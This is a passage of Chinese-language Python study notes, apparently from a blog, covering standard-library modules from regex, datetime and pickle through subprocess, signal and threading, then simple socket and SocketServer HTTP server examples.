[a-f]      a-f范围内的一个字符
[^m]       不是m的一个字符
\s         一个空格
\S         一个非空格
\d         [0-9]
\D         [^0-9]
\w         [0-9a-zA-Z]
\W         [^0-9a-zA-Z]
```

**重复**

```
*         重复 >=0 次
+         重复 >=1 次
?         重复 0或者1 次
{m}       重复m次。比如说 a{4}相当于aaaa，再比如说[1-3]{2}相当于[1-3][1-3]
{m, n}    重复m到n次。比如说a{2, 5}表示a重复2到5次。小于m次的重复，或者大于n次的重复都不符合条件。
```

**位置**

```
^ 字符串的起始位置
$ 字符串的结尾位置
```

**返回控制**

我们有可能对搜索的结果进行进一步精简信息。

```python
m = re.search("output_(\d{4})","output_1988.txt")
# 用括号()包围了一个小的正则表达式，\d{4}。
# 这个小的正则表达式被用于从结果中筛选想要的信息（在这里是四位数字）。
# 这样被括号圈起来的正则表达式的一部分，称为群(group)。
print(m.group(0))   # output_1988
print(m.group(1))   # 1988
# group(0)是整个正则表达的搜索结果，group(1)是第一个群
```

我们还可以使用 `?P<name>` 将群命名，以便更好地使用m.group查询:

```python
m = re.search("output_(?P<year>\d{4})", "output_1988.txt")
# (?P<name>...) 为group命名
print(m.group('year'))  # 1988
```

## 时间与日期 (time, datetime包)

### time包

time包基于C语言的库函数(library functions)。

```python
import time
print(time.time())  # 1653461946.6619015 挂钟时间(wall clock time)
# time.sleep(3)     # 休眠三秒
print(time.ctime()) # Thu May 26 18:45:49 2021

st = time.gmtime()  # 返回struct_time格式的UTC时间
print(st)           # time.struct_time(tm_year=2021, ...)
print(st.tm_zone)   # UTC
st = time.localtime()   # 返回struct_time格式的当地时间, 当地时区根据系统环境决定。
s = time.mktime(st) # 将struct_time格式转换成wall clock time
print(s)            # 1653462216
```

### datetime包

**简介**

datetime包是基于time包的一个高级包， 为我们提供了多一层的便利。

datetime可以理解为date和time两个组成部分。date是指年月日构成的日期(相当于**日历**)，time是指时分秒微秒构成的一天24小时中的具体时间(相当于**手表**)。你可以将这两个分开管理(datetime.date类，datetime.time类)，也可以将两者合在一起(datetime.datetime类)。

```python
import datetime
t = datetime.datetime(2012,9,6,21,30)
print(t)    # 2012-09-06 21:30:00
# t包含以下属性:
# hour, minute, second, microsecond,year, month, day, weekday
print(t.hour)   # 21
print(t.microsecond)    # 0
```

**运算**

datetime包还定义了**时间间隔**对象(timedelta)。一个时间点(datetime)**加上**一个时间间隔(timedelta)可以得到一个新的时间点(datetime)。比如今天的上午3点加上5个小时得到今天的上午8点。同理，两个时间点**相减**会得到一个时间间隔。

```python
import datetime
t = datetime.datetime(2012,9,4,21,30)
t_next = datetime.datetime(2012,9,6,21,30)
delta1 = datetime.timedelta(seconds=600)	# 时间间隔1
delta2 = datetime.timedelta(weeks=3)		# 时间间隔2
print(t+delta1)     # 2012-09-04 21:40:00
print(t+delta2)     # 2012-09-25 21:30:00
print(t_next - t)   # 2 days, 0:00:00

# 两个datetime对象还可以进行比较。比如使用上面的t和t_next:
print(t > t_next)     # False
```

**datetime对象与字符串转换**

用格式化读取的方式读取时间信息。

```python
from datetime import datetime
format = "output_%Y-%m-%d-%H%M%S.txt"	# 定义时间输出格式
str = "output_1997-12-23-030000.txt"	# 获取时间字符串
t = datetime.strptime(str,format)		# 将字符串转化为标准格式时间
print(t)        # 1997-12-23 03:00:00
t_next = datetime(2012,9,6,21,30)
print(t_next.strftime(format))  # output_2012-09-06-213000.txt 将时间转化为字符串
```

```python
# 案例
# 字符串转时间戳
print(time.mktime(time.strptime("2021-05-25 16:39:19",'%Y-%m-%d %H:%M:%S')))
# 时间戳转字符串
print(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(1621931959)))
```

## 数学与随机数 (math包，random包)

**math包**补充了很多的函数。如果想要更加高级的数学功能，可以考虑选择标准库之外的**numpy**和**scipy**项目，它们不但支持数组和矩阵运算，还有丰富的数学和物理方程可供使用。

**random包**可以用来生成**随机数**。随机数不仅可以用于数学用途，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。

### math包

math包主要处理数学相关的运算。math包定义了两个常数:

```python
math.e   # 自然常数e
math.pi  # 圆周率pi
```

此外，math包还有各种运算函数 (下面函数的功能可以参考数学手册)：

```python
math.ceil(x)       # 对x向上取整，比如x=1.2，返回2
math.floor(x)      # 对x向下取整，比如x=1.2，返回1
math.pow(x,y)      # 指数运算，得到x的y次方
math.log(x)        # 对数，默认基底为e。可以使用base参数，来改变对数的基地。比如math.log(100,10)
math.sqrt(x)       # 平方根
```

三角函数: `math.sin(x), math.cos(x), math.tan(x), math.asin(x), math.acos(x), math.atan(x)`

这些函数都接收一个弧度(radian)为单位的x作为参数。

角度和弧度互换: `math.degrees(x), math.radians(x)`

双曲函数: `math.sinh(x), math.cosh(x), math.tanh(x), math.asinh(x), math.acosh(x), math.atanh(x)`

特殊函数： `math.erf(x), math.gamma(x)`

### random包

```
文档 : https://docs.python.org/3/library/random.html
```

```python
import random
random.seed(x)		# 改变随机数生成器的种子seed

# 随机挑选和排序
random.choice(seq)   # 从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。
random.sample(seq,k) # 从序列中随机挑选k个元素
random.shuffle(seq)  # 将序列的所有元素随机排序

# 随机生成实数
random.random()           # 随机生成下一个实数，它在[0,1)范围内。
random.uniform(a,b)       # 随机生成下一个实数，它在[a,b]范围内。
random.gauss(mu,sigma)    # 随机生成符合高斯分布的随机数，mu,sigma为高斯分布的两个参数。 
random.expovariate(lambd) # 随机生成符合指数分布的随机数，lambd为指数分布的参数。
```

## 路径与文件 (os.path包, glob包)

### os.path包

os.path包主要是**处理路径字符串**，比如说'/home/vamei/doc/file.txt'，提取出有用信息。

```python
import os.path
path = '/home/vamei/doc/file.txt'
print(os.path.basename(path))   # file.txt
print(os.path.dirname(path))    # /home/vamei/doc

info = os.path.split(path)  # 将路径分割成文件名和目录两个部分，放在一个表中返回
print(info)     # ('/home/vamei/doc', 'file.txt')
path2 = os.path.join('/','home', 'vamei', 'doc', 'file1.txt')   # 使用目录名和文件名构成一个路径字符串
print(path2)    # /home\vamei\doc\file1.txt

p_list = [path,path2]
print(os.path.commonpath(p_list))   # \home\vamei\doc 查询多个路径的共同部分
print(os.path.commonprefix(p_list)) # /home

print(os.path.normpath(path2))   # \home\vamei\doc\file1.txt  规范化路径
```

os.path还可以查询文件的**相关信息**(metadata)。文件的相关信息不存储在文件内部，而是由操作系统维护的，关于文件的一些信息(比如文件类型，大小，修改时间)。

```python
import os.path
path = './first1.py'
print(os.path.exists(path)) # True 查询文件是否存在
print(os.path.getsize(path))    # 42 查询文件大小
atime = os.path.getatime(path)  # 1621931959 查询文件上一次读取的时间
mtime = os.path.getmtime(path)  # 1621931959 查询文件上一次修改的时间
print(os.path.isfile(path)) # True 路径是否指向常规文件
print(os.path.isdir(path))  # False 路径是否指向目录
```

### glob包

`glob.glob()`。接受一个Linux式的文件名格式表达式(filename pattern expression)，列出所有**符合该表达式的文件**（与正则表达式类似），将所有文件名放在一个表中返回。所以glob.glob()是一个查询目录下文件的好方法。

文件名格式表达式:

| Filename Pattern Expression | Python Regular Expression |
| --------------------------- | ------------------------- |
| *                           | .*                        |
| ?                           | .                         |
| [0-9]                       | same                      |
| [a-e]                       | same                      |
| [^mnp]                      | same                      |

```python
# 示例
import glob
print(glob.glob('./*')) # 找出当前目录下的所有文件
```

![image-20220611020838258](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/19c00384fa3911fab0490bef85d6a05e-9078828.png)

## 文件管理 (部分os包，shutil包)

Python标准库则允许我们从Python内部管理文件。

### os包

os包包括各种各样的函数，以实现操作系统的许多功能。这个包非常庞杂。os包的一些命令就是用于文件管理。

常用的有:

```python
import os
path = './ostest'
os.mkdir(path)    # 创建新目录,不可重复创建同名文件夹
os.rmdir(path)    # 删除空的目录
print(os.listdir(path)) # 返回目录中所有文件
os.remove(path+'/record.txt')   # 删除 path指向的文件。
os.rename(path+'/record1.txt',path+'/record.txt')   # 重命名文件
import stat
os.chmod(path,stat.S_IRWXU) # 改变path指向的文件的权限
os.chown(path+'/record.txt',uid,gid) # 改变path所指向文件的拥有者和拥有组
print(os.stat(path))    # os.stat_result(st_mode=16749,..) 查看path所指向文件的附加信息
os.symlink(path+'/record.txt',path+'/newlink')    # 为文件创建软链接
print(os.getcwd())  # 查询当前工作路径 current working directory
```

### shutil包

- copy(src, dst) **复制**文件，从src到dst。相当于$cp命令。
- move(src, dst) **移动**文件，从src到dst。相当于$mv命令。

```python
import shutil
# print(help(shutil))
path = './ostest'
path2 = './shutiltest'
shutil.copy(path+"/record.txt",path2+"/r.txt") # 复制文件
shutil.move(path+"/record.txt",path+"/record1.txt") # 移动文件
```

## 存储对象 (pickle包，cPickle包)

Python“一切皆对象”, 在Python中，无论是变量还是函数，都是一个对象。**如何将对象保存到文件**，并储存在硬盘上呢

计算机的内存中存储的是二进制的序列 (当然，在Linux眼中，是文本流)。我们可以直接将某个对象所对应位置的数据抓取下来，转换成**文本流** (这个过程叫做serialize)，然后将文本流存入到文件中。由于Python在创建对象时，要**参考对象的类定义**，所以当我们从文本中读取对象时，必须在手边要有该对象的类定义，才能懂得如何去重建这一对象。

从文件读取时，对于Python的内建(built-in)对象 (比如说整数、词典、表等等)，由于其类定义已经载入内存，所以不需要我们再在程序中定义类。但对于用户自行定义的对象，就**必须要先定义类**，然后才能从文件中载入对象

### pickle包

**将内存中的对象转换成为文本流：**

```python
import pickle

class Bird(object):
    have_feather = True
    way_of_reproduction = 'egg'

summer = Bird()
pickleString = pickle.dumps(summer)
print(pickleString)

# 写入文件二进制数据
file = open('record3.txt','wb')
file.write(pickleString)
file.close()

# 读取文件中二进制数据
f = open('record3.txt','rb')
print(f.read())

# 或者使用上下文管理
with open('record4.txt','wb') as f:
    prickString = pickle.dump(summer, f)
```

![image-20220611021533243](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/212be58b3f7ece4b41855070e397c874-485f888.png)

**重建对象**

首先从文本中读出文本，存储到字符串 (文本文件的输入输出)。然后使用`pickle.loads(str)`的方法，将字符串转换成为对象。要记得，此时我们的程序中必须已经有了该对象的类定义。

```python
import pickle
file = open('record3.txt','rb')
pString = file.read()
print(pString)
summer = pickle.loads(pString)
print(summer.__class__) # <class '__main__.Bird'>

# 或者使用上下文管理
with open('record4.txt','rb') as f:
    summer = pickle.load(f)

print(summer)   # <__main__.Bird object at 0x01DE0118>
```

![image-20220611021850001](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4a300538477b7b2a74059dfd762a62ef-c903b77.png)

### cPickle包

cPickle包的功能和用法与pickle包几乎完全相同 (其存在差别的地方实际上很少用到)，不同在于cPickle是基于c语言编写的，速度是比pickle包的快。如果想使用cPickle包，我们都可以将import语句改为:

```python
import cPickle as pickle
```

## 子进程 (subprocess包)

subprocess包主要功能是**执行外部的命令和程序**。比如在Python中调用wget程序。从这个意义上来说，subprocess的功能与shell类似。

### 常用的封装函数

使用subprocess包中的函数创建子进程的时候，要注意:

- 1 在创建子进程之后，父进程是否暂停，并等待子进程运行。
- 2 函数返回什么
- 3 当returncode不为0时，父进程如何处理。

```python
import subprocess

# (1)、subprocess.call()
# 父进程等待子进程完成
# 返回退出信息(returncode，相当于exit code)
rc = subprocess.call('dir /A', shell=True)
rc = subprocess.call(['dir', '/A'], shell=True)
print(rc)   # 0

# (2)、subprocess.check_call()
# 父进程等待子进程完成, 返回0
# 检查退出信息，如果returncode不为0，则举出错误subprocess.CalledProcessError，
# 该对象包含有returncode属性，可用try...except...来检查(见Python错误处理)。
rc = subprocess.check_call(['dir'],shell=True)
print(rc)	# 0

# (3)、subprocess.check_output()
# 父进程等待子进程完成, 返回子进程向标准输出的输出结果
# 检查退出信息，如果returncode不为0，则举出错误subprocess.CalledProcessError，
# 该对象包含有returncode属性和output属性，output属性为标准输出的输出结果，可用try...except...来检查。
try:
    rc = subprocess.check_call(['dir','-al'],shell=True)
    print(rc)
except subprocess.CalledProcessError:
    print(subprocess.CalledProcessError.output)
    print(subprocess.CalledProcessError.returncode)
```

### Popen()

上面的三个函数都是基于Popen()的封装(wrapper)

与上面的封装不同，Popen对象创建后，主程序不会自动等待子进程完成。

我们必须调用对象的wait()方法，父进程才会等待 (也就是阻塞block)

```python
import subprocess
child = subprocess.Popen(['ping','-c','5','www.hao123.com'])

child.wait()
print('parent process')
# 还可以在父进程中对子进程进行其它操作
# child.poll()        # 检查子进程状态
# child.kill()        # 终止子进程
# child.send_signal() # 向子进程发送信号
# child.terminate()   # 终止子进程
# print(child.pid)    # 获取子进程的PID
# print(child.stdin)  # 获取子进程的标准输入
# print(child.stdout)  # 获取子进程的标准输出
# print(child.stderr)  # 获取子进程的标准错误
```

### 子进程的文本流控制

我们可以在Popen()建立子进程的时候改变标准输入、标准输出和标准错误，

并可以利用subprocess.PIPE将多个子进程的输入和输出连接在一起，构成管道(pipe):

```python
import subprocess
child1 = subprocess.Popen(["ls","-l"], stdout=subprocess.PIPE)
child2 = subprocess.Popen(["wc"], stdin=child1.stdout,stdout=subprocess.PIPE)
out = child2.communicate()
print(out)
# subprocess.PIPE实际上为文本流提供一个缓存区。
# child1的stdout将文本输出到缓存区，随后child2的stdin从该PIPE中将文本读取走。
# child2的输出文本也被存放在PIPE中，直到communicate()方法从PIPE中读取出PIPE中的文本。
# communicate()是Popen对象的一个方法，该方法会阻塞父进程，直到子进程完成。
```

还可以利用communicate()方法来使用PIPE给子进程输入:

```python
import subprocess
child = subprocess.Popen(['type'],stdin=subprocess.PIPE,shell=True)
child.communicate('vamei')
# 我们启动子进程之后，cat会等待输入，直到我们用communicate()输入"vamei"。
# communicate()是Popen对象的一个方法，该方法会阻塞父进程，直到子进程完成。
```

## 信号 (signal包)

```
# signal包负责在Python程序内部处理信号，典型的操作包括预设信号处理函数，暂停并等待信号，以及定时发出SIGALRM等。
# 要注意，signal包主要是针对UNIX平台(比如Linux, MAC OS)，而Windows内核中由于对信号机制的支持不充分，所以在Windows上的Python不能发挥信号系统的功能。
# On Windows, signal() can only be called with SIGABRT, SIGFPE, SIGILL, SIGINT, SIGSEGV, or SIGTERM. A ValueError will be raised in any other case.
```

### 定义信号名

signal包定义了各个信号名及其对应的整数，比如：

```python
import signal
print signal.SIGALRM    # 14
print signal.SIGCONT    # 18
```

Python所用的信号名和Linux一致。你可以通过以下命令查询：

```shell
$ man 7 signal  # 这一条命令在实验楼环境中无法执行成功，需要在真实的 Linux 系统中才能成功执行
```

### 预设信号处理函数

signal包的核心是使用**signal.signal()**函数来预设(register)信号处理函数，如下所示：

```python
signal.signal(signalnum, handler)   # signalnum为某个信号，handler为该信号的处理函数
# 当handler为signal.SIG_IGN时，信号被无视(ignore)。
# 当handler为singal.SIG_DFL，进程采取默认操作(default)。
# 当handler为一个函数名时，进程采取函数中定义的操作。
```

```python
# 示例
import signal
# 定义信号处理函数
def myHandle(signum,frame):
    print('I received signal: ', signum)
# 注册函数到信号上
signal.signal(signal.SIGTSTP, myHandle)
signal.pause()
print('End of Signal Demo')
```

![image-20220611030743503](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d89f8ff55a23e945552d53d547869a08-9970e68.png)

myHandler的两个参数一个用来识别信号(signum)，另一个用来获得信号发生时，进程栈的状况(stack frame)。这两个参数都是由signal.singnal()函数来传递的。

当程序运行到signal.pause()的时候，进程暂停并等待信号。此时，通过按下CTRL+Z向该进程发送**SIGTSTP信号**。可以看到，进程执行了myHandle()函数, 随后返回主程序，继续执行。

### 定时发出SIGALRM信号

函数`signal.alarm()`，它被用于在**一定时间之后**，向进程自身发送**SIGALRM**信号:

```python
import signal
def myHandle(signum,frame):
    print('it is time to alarm')
    exit()

signal.signal(signal.SIGALRM, myHandle)
signal.alarm(5)
while True:
    print('not yet')
# 用了一个无限循环以便让进程持续运行。在signal.alarm()执行5秒之后，进程将向自己发出SIGALRM信号，随后，信号处理函数myHandler开始执行。
```
效果如下:

```
not yet
...
not yet
it is time to alarm
```

### 发送信号

signal包的核心是设置信号处理函数。除了signal.alarm()向自身发送信号之外，并没有其他发送信号的功能。

但在os包中，有类似于linux的kill命令的函数，分别为：

```python
import os
os.kill(pid,sig)
os.killpg(pgid,sig)
# 分别向进程和进程组发送信号。sig为信号所对应的整数或者singal.SIG*
```

## 多线程与同步 (threading包)

Python主要通过标准库中的**threading**包来实现多线程。

### 多线程售票以及同步

使用mutex (也就是Python中的**Lock**类对象) 来实现线程的同步:

```python
import threading,time,os
def doSomeThing():
    time.sleep(0.5)

def booth(tid):	# 每个线程执行动作
    global i,lock
    while True:
        lock.acquire()	# 锁定, 或者等待其他线程释放
        if i != 0:
            i-=1		# 售出票
            print(tid,':now left:',i)	# 打印余票
            doSomeThing()   # 可以安全地使用共享资源
        else:
            print('thread_id',tid,' no more tickets')
            os._exit(0)		# 立即退出所有操作
        lock.release()		# 释放锁
        doSomeThing()   # 可以做一些不使用共享资源的操作

i = 100
lock = threading.Lock() # 互斥锁 (mutex)

for k in range(10):
    new_thread = threading.Thread(target=booth,args=(k,))
    new_thread.start()
# for循环中利用threading.Thread()的方法来创建一个Thread对象，并将函数booth()以及其参数传递给改对象，并调用start()方法来运行线程。
```

使用两个全局变量，一个是i，用以储存剩余票数；一个是lock对象，用于同步线程对i的修改。

此外，在最后的for循环中，我们总共设置了10个线程。每个线程都执行booth()函数。线程在调用start()方法的时候正式启动 (实际上，计算机中最多会有11个线程，因为主程序本身也会占用一个线程)。

Python使用**threading.Thread**对象来代表线程，用**threading.Lock**对象来代表一个互斥锁 (mutex)。

有两点需要注意:

- 在函数中使用**global**来声明变量为全局变量，从而让多线程共享i和lock。如果不这么声明，由于i和lock是**不可变数据对象**，它们将被当作一个局部变量。如果是**可变数据对象**的话，则不需要global声明。我们甚至可以将**可变数据对象**作为参数来传递给线程函数。这些线程将共享这些可变数据对象。
- 在booth中使用了两个**doChore()**函数。可以在未来改进程序，以便让线程除了进行i=i-1之外，做更多的操作，比如打印剩余票数，找钱，或者喝口水之类的。第一个doChore()依然在Lock内部，所以可以安全地**使用共享资源** (critical operations, 比如打印剩余票数)。第二个doChore()时，Lock已经被释放，所以不能再去使用共享资源。这时候可以做一些**不使用共享资源**的操作 (non-critical operation, 比如找钱、喝水)。

### OOP创建线程

通过**面向对象** (OOP， object-oriented programming) 的方法实现多线程，其核心是继承**threading.Thread**类。

上面的for循环中已经利用了threading.Thread()的方法来创建一个Thread对象，并将函数booth()以及其参数传递给改对象，并调用start()方法来运行线程。OOP的话，通过修改Thread类的**run()**方法来定义线程所要执行的命令。

```python
import threading,time,os
def doSomeThing():
    time.sleep(0.5)

class BoothThread(threading.Thread):	# 每个进程执行动作
    def __init__(self,tid,monitor):
        self.tid = tid
        self.monitor = monitor
        threading.Thread.__init__(self)
    def run(self):
        while True:
            monitor['lock'].acquire()	# 锁定, 或者等待其他线程释放
            if monitor['tick'] != 0:
                monitor['tick'] -= 1	# 售票
                print(self.tid, ': now left :', monitor['tick'])	
                doSomeThing()
            else:
                print('thread_id', self.tid, ' no more tickets')
                os._exit(0)
            monitor['lock'].release()	# 释放锁
            doSomeThing()

monitor = {'tick':20,'lock':threading.Lock()}
for k in range(10):
    new_thread = BoothThread(k,monitor)
    new_thread.start()
```

定义了一个类BoothThread, 这个类继承自thread.Threading类。

然后把上面的booth()所进行的操作统统放入到BoothThread类的run()方法中。

没有使用全局变量声明global，而是使用了一个词典monitor存放全局变量，然后把词典作为参数传递给线程函数。

由于词典是可变数据对象，所以当它被传递给函数的时候，函数所使用的依然是同一个对象，相当于被多个线程所共享。

### 其他

**threading.Thread**对象： 我们已经介绍了该对象的start()和run(), 此外：

- **join()**方法，调用该方法的线程将等待直到该Thread对象完成，再恢复运行。这与进程间调用wait()函数相类似。

下面的对象用于处理**多线程同步**。对象一旦被建立，可以被多个线程共享，并根据情况阻塞某些进程。

下面的对象用于处理**多线程同步**。对象一旦被建立，可以被多个线程共享，并根据情况阻塞某些进程。

**threading.Lock**对象: mutex, 有acquire()和release()方法。

**threading.Condition**对象: condition variable，建立该对象时，会包含一个Lock对象 (因为condition variable总是和mutex一起使用)。可以对Condition对象调用acquire()和release()方法，以控制潜在的Lock对象。此外:

- **wait()**方法，相当于cond_wait()
- **notify_all()**，相当与cond_broadcast()
- **nofify()**，与notify_all()功能类似，但只唤醒一个等待的线程，而不是全部

**threading.Semaphore**对象: semaphore，也就是计数锁(semaphore传统意义上是一种进程间同步工具)。创建对象的时候，可以传递一个整数作为**计数上限** (sema = threading.Semaphore(5))。它与Lock类似，也有Lock的两个方法。

**threading.Event**对象: 与threading.Condition相类似，相当于没有潜在的Lock保护的condition variable。对象有True和False两个状态。可以多个线程使用wait()等待，直到某个线程调用该对象的**set()**方法，将对象设置为True。线程可以调用对象的**clear()方法来重置对象为False状态。

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python06网络</title>
    <url>/2022/03/21/Python/Python06%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[
# Python网络

## 原始Python服务器

不使用框架，甚至不使用Python标准库中的高级包，只使用标准库中的socket接口，写一个Python服务器。

socket接口是实际上是**操作系统**提供的**系统调用**。socket的使用并不局限于Python语言，你可以用C或者JAVA来写出同样的socket服务器，而所有语言使用socket的方式都类似(Apache就是使用C实现的服务器)。

### TCP/IP和socket

socket是**进程间通信**的一种方法，它是基于网络传输协议的上层接口。socket有许多种类型，比如基于TCP协议或者UDP协议(两种网络传输协议)。其中又以**TCP socket**最为常用。

TCP socket与双向管道(duplex PIPE)有些类似，一个进程向socket的一端写入或读取文本流，而另一个进程可以从socket的另一端读取或写入，比较特别是，这两个建立socket通信的进程**可以分别属于两台不同的计算机**。

所谓的TCP协议，就是规定了一些通信的守则，以便在网络环境下能够有效实现上述进程间通信过程。双向管道(duplex PIPE)存活于同一台电脑中，所以不必区分两个进程的所在计算机的地址，而socket必须包含有地址信息，以便实现网络通信。

一个socket包含四个地址信息: 两台计算机的IP地址和两个进程所使用的端口(port)。IP地址用于**定位计算机**，而port用于**定位进程** (一台计算机上可以有多个进程分别使用不同的端口)。

### TCP socket

在互联网上，我们可以让某台计算机作为服务器。**服务器**开放自己的端口，**被动**等待其他计算机连接。当其他计算机作为**客户**，**主动**使用socket连接到服务器的时候，服务器就开始为客户提供服务。

在Python中，我们使用标准库中的**socket包**来进行底层的socket编程。

首先是**服务器端**，我们使用**bind()**方法来赋予socket以固定的地址和端口，并使用**listen()**方法来被动的监听该端口。当有客户尝试用**connect()**方法连接的时候，服务器使用**accept()**接受连接，从而建立一个连接的socket

#### 服务端代码

```python
#! /usr/bin/python
# coding=utf8
# 服务端
import socket
# 地址信息
HOST = ''
PORT = 8085
reply = 'Yes'
# socket使用的是IPv4(AF_INET，IP version 4)和TCP协议(SOCK_STREAM)。
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST,PORT))	# 依据传入tuple绑定本机IP/端口
s.listen(3)	# 最大链接数为3
while True:	# 保持监听, 持续响应
	conn,addr = s.accept()	# 获取接收数据及来源IP
	request = conn.recv(1024)	# 接收数据
	print('connected by: ', addr)
	print('request is: ', request)
	conn.sendall(reply)		# 发送数据给请求方
conn.close()

```

#### 客户端代码

```python
#! /usr/bin/python
# coding=utf8
# 客户端
import socket
HOST = '192.168.253.134'
PORT = 8085
request = 'Can you hear me?'
# socket使用的是IPv4(AF_INET，IP version 4)和TCP协议(SOCK_STREAM)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))	# 搜索链接服务器端的IP地址和端口
s.sendall(request)
reply = s.recv(1024)
print('reply is: ',reply)
s.close()
```

> 我们对socket的两端都可以调用**recv()**方法来接收信息，调用**sendall()**方法来发送信息。这样，我们就可以在分处于两台计算机的两个进程间进行通信了。当通信结束的时候，我们使用**close()**方法来关闭socket连接。

![image-20220611142632171](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2916b54f049c66dc4384b7834372154e-14a8f9e.png)

### 基于TCP socket的HTTP服务器

socket传输自由度太高，从而带来很多安全和兼容的问题。我们往往利用一些应用层的协议(比如HTTP协议)来规定socket **使用规则**，以及所传输信息的**格式**。

**HTTP**协议利用**请求-回应(request-response)**的方式来使用TCP socket。客户端向服务器发一段文本作为request，服务器端在接收到request之后，向客户端发送一段文本作为response。在完成了这样一次request-response交易之后，TCP socket被废弃。下次的request将建立新的socket。request和response本质上说是两个文本，只是HTTP协议对这两个文本都有一定的格式要求。

如下为一个HTTP服务器案例:

```python
#! /usr/bin/python
# coding=utf8
import socket

HOST = ''
PORT = 8086

text_content = '''
HTTP/1.x 200 OK
Content-Type: text/html

<head>
<title>NI9NE</title>
</head>
<html>
<p> This is NI9NE's Python Http Server</p>
<img src='ni9ne.png'/>
</html>
'''

f = open('ni9ne.png','rb')
# 构建响应头信息
pic_content = '''
HTTP/1.x 200 OK
Content-Type: image/png

'''
pic_content = pic_content + f.read()
f.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST,PORT))

while True:
    s.listen(3)
    conn,addr = s.accept()
    request = conn.recv(1024)
    request_info = request.split(' ')
    method = request_info[0]
    src = request_info[1]
    
    if method == 'GET':
        if src == '/ni9ne.png':
            content = pic_content
        else:
            content = text_content
        
        print('Connected by: ', addr)
        print('Request is: ', request)
        
        conn.sendall(content)
        
    conn.close()
```

![image-20220612165645276](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e1b3857b552123dad1491bebd0786028-9450970.png)

> socket包是比较底层的包。Python标准库中还有高层的包，比如SocketServer，SimpleHTTPServer，CGIHTTPServer，cgi。

## Python服务器进化

### 支持POST

即从POST请求中提取数据，再显示在屏幕上。

```python
#! /usr/bin/python
# coding=utf8
import socket

HOST = ''
PORT = 8087

text_content = '''
HTTP/1.x 200 OK  
Content-Type: text/html

<head>
<title>NI9NE</title>
</head>
<html>
<p> This is NI9NE's Python Http Server</p>
<img src='ni9ne.png'/>
<form name="input" action="/" method="post">
First name:<input type="text" name="firstname"><br>
<input type="submit" value="Submit">
</form> 
</html>
'''

f = open('ni9ne.png','rb')
pic_content = '''
HTTP/1.x 200 OK  
Content-Type: image/jpg

'''
pic_content = pic_content + f.read()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))

while True:
    s.listen(3)
    conn, addr = s.accept()                    
    request    = conn.recv(1024)         # 接收缓冲区大小

    method     = request.split(' ')[0]
    src        = request.split(' ')[1]

    print 'Connected by', addr
    print 'Request is:', request

    if method == 'GET':

        if src == '/ni9ne.png':
            content = pic_content
        else: content = text_content

        conn.sendall(content)

    if method == 'POST':
        form = request.split('\r\n')
        print form
        idx = form.index('')             # 空行索引
        print idx
        entry = form[idx:]               # post包所有数据

        value = entry[-1].split('=')[-1]
        conn.sendall(text_content + '\n <p>post value is: ' + value + '</p>')
        
    conn.close()
```

![image-20220613231535023](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f7fc5715ce3f0f3e1657e14d1b24d1cd-4acf5eb.png)



post包 `request.split(' ')` 结果

```
['POST', '/', 'HTTP/1.1\r\nHost:', '192.168.253.134:8087\r\nConnection:', 'keep-alive\r\nContent-Length:', '14\r\nPragma:', 'no-cache\r\nCache-Control:', 'no-cache\r\nUpgrade-Insecure-Requests:', '1\r\nOrigin:', 'http://192.168.253.134:8087\r\nContent-Type:', 'application/x-www-form-urlencoded\r\nUser-Agent:', 'Mozilla/5.0', '(Windows', 'NT', '10.0;', 'Win64;', 'x64)', 'AppleWebKit/537.36', '(KHTML,', 'like', 'Gecko)', 'Chrome/98.0.4758.82', 'Safari/537.36\r\nAccept:', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer:', 'http://192.168.253.134:8087/\r\nAccept-Encoding:', 'gzip,', 'deflate\r\nAccept-Language:', 'zh-CN,zh;q=0.9\r\n\r\nfirstname=1232']

```

### 使用SocketServer

> 基于TCP协议

```python
#! /usr/bin/python
# coding=utf8
import SocketServer as socketserver

HOST = ''
PORT = 8086

text_content = '''
HTTP/1.x 200 OK
Content-Type: text/html

<head>
<title>NI9NE</title>
</head>
<html>
<p> This is NI9NE's Python Http Server</p>
<img src='ni9ne.png'/>
<form name="input" action="/" method="post">
first name: <input type="text" name="firstname"><br/>
<input type="submit" value="Submit">
</form>
</html>
'''

f = open('ni9ne.png','rb')
pic_content = '''
HTTP/1.x 200 OK
Content-Type: image/png

'''
pic_content = pic_content + f.read()
f.close()

# 传递给TCPServer一个MyTCPHandler类。这个类定义了如何操作socket。MyTCPHandler继承自BaseRequestHandler。改写handler()方法，来具体规定不同情况下服务器的操作。
class MyTCPHandle(socketserver.BaseRequestHandler):
    def handle(self):
        # 在handler()中，通过self.request来查询通过socket进入服务器的请求 (正如在handler()中对socket进行recv()和sendall()操作)，还使用self.address来引用socket的客户端地址。
        request = self.request.recv(1024)

        print('Connected by', self.client_address[0])
        print('Request is:', request)

        method = request.split(' ')[0]
        src = request.split(' ')[1]

        if method == 'GET':
            if src == '/ni9ne.png':
                content = pic_content
            else:
                content = text_content
            self.request.sendall(content)   # 使用self.request代替原有的conn

        if method == 'POST':
            form = request.split('\r\n')
            idx = form.index('')
            entry = form[idx:]

            value = entry[-1].split('=')[-1]
            self.request.sendall(text_content + '\n <p>post value is: ' + value + '</p>')

# 建立了一个TCPServer对象，即一个使用TCP socket的服务器。在建立TCPServe的同时，设置该服务器的IP地址和端口。
server = socketserver.TCPServer((HOST,PORT),MyTCPHandle)

# 使用server_forever()方法来让服务器不断工作(就像原始程序中的while循环一样)。
